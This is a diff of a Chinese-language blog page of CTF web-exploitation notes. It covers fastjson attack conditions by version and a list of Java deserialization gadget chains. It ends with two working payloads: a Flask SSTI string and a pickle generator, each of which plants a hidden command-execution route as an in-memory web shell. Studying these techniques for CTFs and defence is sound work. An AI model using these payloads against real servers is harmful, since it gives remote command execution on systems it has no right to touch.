@@ -636,25 +636,33 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131695528">https://blog.csdn.net/m0_73185293/article/details/131695528</a></p>
 <h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>fastjson目标不出网，&lt;&#x3D;1.2.24下打BCEL，需要回显可以打内存马</p>
 <p>目标出网 ，&lt;&#x3D;1.2.47，打JNDI</p>
+<p>1.2.68+commons-io能写文件</p>
 <h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>一个gadget衔接合集，仅统计常用衔接链</p>
 <p>Hessian2反序列化和Kryo、FST反序列化会触发hashMap.put</p>
-<p>compare通常伴随着任意getter调用</p>
+<p>compare通常伴随着任意getter调用（因为compare需要逐项取值对比）</p>
 <p>BadAttributeValueExpException.readObject -&gt; toString</p>
+<p>(JDK8u65) AnnotationInvocationHandler.invoke -&gt; get</p>
+<p>(jdk7u21&#x2F;8u20 rce) AnnotationInvocationHandler.equalsImpl -&gt; invoke </p>
+<p>PriorityQueue.readObject -&gt; compare</p>
+<p>(cb) PropertyUtils.getProperty -&gt; getter</p>
 <p>(jackson&#x2F;springboot) POJONode.toString -&gt; JSON.writeValueAsString -&gt;getter</p>
 <p>(jackson) ObjectMapper.readValue -&gt; setter&#x2F;constructor&#x2F;getter</p>
 <p>(jackson) JSONFactory.createParser -&gt; setter&#x2F;constructor</p>
 <p>(fastjson) JSON.parse -&gt; setter</p>
-<p>(fastjson) JSON.parseObject -&gt; settter&#x2F;getter</p>
+<p>(fastjson) JSON.parseObject -&gt; setter&#x2F;getter</p>
+<p>(fastjson) JSONObject.toString -&gt; getter (1.2.83都能打原生二次反序列化)</p>
 <p>signedObject.getObject -&gt; readObject</p>
 <p>JdbcRowSetImpl.setAutoCommit -&gt;  JNDI</p>
 <p>(Tomcat) BasicDataSource.getConnection -&gt; Class.forName</p>
-<p>(JDK8u65) AnnotationInvocationHandler.invoke -&gt; get</p>
-<p>(jdk7u21&#x2F;8u20 rce) AnnotationInvocationHandler.equalsImpl -&gt; invoke </p>
-<p>PriorityQueue.readObject -&gt; compare</p>
 <p>(c3p0) ReferenceableUtils#ReferenceSerialized.referenceToObject -&gt; Reference JNDI</p>
-<p>(rome) ToStringBean.toString -&gt; invoke</p>
-<p>(tome) EqualsBean.beanEquals -&gt; invoke</p>
+<p>(rome) ToStringBean.toString -&gt; getter</p>
+<p>(rome) EqualsBean.beanEquals -&gt; getter</p>
+<p>(rome) EqualsBean.hashCode -&gt; toString</p>
 <p>(spring) XString.equals -&gt; toString</p>
+<p>(spring) HashMap.put -&gt; HotSwappableTargetSource.equals -&gt; equals</p>
+<p>HashMap、HashSet、HashTable直接传两个一样的值碰撞也能触发equals（见<a href="https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE">https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE</a>) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap/HashSet/HashTable.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.putval</span><br><span class="line">HashMap.equals</span><br><span class="line">Abstractmap.equals</span><br><span class="line">equals</span><br></pre></td></tr></table></figure>
+
 <p>(spring) ClassPathXmlApplicationContext.ClassPathXmlApplicationContext -&gt; spEL注入</p>
 <h3 id="CC-Gadget"><a href="#CC-Gadget" class="headerlink" title="CC Gadget"></a>CC Gadget</h3><p>CC Gadget提纯</p>
 <p>TransformedMap.checkSetValue -&gt; transform (CC1)</p>
@@ -664,7 +672,8 @@
 <p>TrAXFilter.TrAXFilter -&gt; newTransformer (CC3)</p>
 <p>TiedMapEntry.toString -&gt; getValue -&gt; get (CC5)</p>
 <h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>一般jwt直接破解不了的，考虑原型链污染key。一般jwt考题都伴随了原型链污染</p>
-<h3 id="hessian"><a href="#hessian" class="headerlink" title="hessian"></a>hessian</h3><p>hessian打TemplatesImpl不能readObject初始化tfactory，直接SignedObject-&gt;TemplatesImpl</p>
+<h3 id="hessian"><a href="#hessian" class="headerlink" title="hessian"></a>hessian</h3><p>hessian一般伴随着能触发hashMap.put</p>
+<p>hessian打TemplatesImpl不能readObject初始化tfactory，直接SignedObject-&gt;TemplatesImpl</p>
 <h3 id="无回显问题"><a href="#无回显问题" class="headerlink" title="无回显问题"></a>无回显问题</h3><h4 id="flask-SSTI无回显"><a href="#flask-SSTI无回显" class="headerlink" title="flask SSTI无回显"></a>flask SSTI无回显</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell3%27,%20%27shell2%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27ls%20/%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="pickle不出网无回显"><a href="#pickle不出网无回显" class="headerlink" title="pickle不出网无回显"></a>pickle不出网无回显</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;import sys</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].debug=False</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_url_rule(&#x27;/shell1&#x27;,&#x27;shell1&#x27;,lambda :__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line">basepoc = base64.b64encode(poc)</span><br><span class="line"><span class="built_in">print</span>(basepoc)</span><br></pre></td></tr></table></figure>
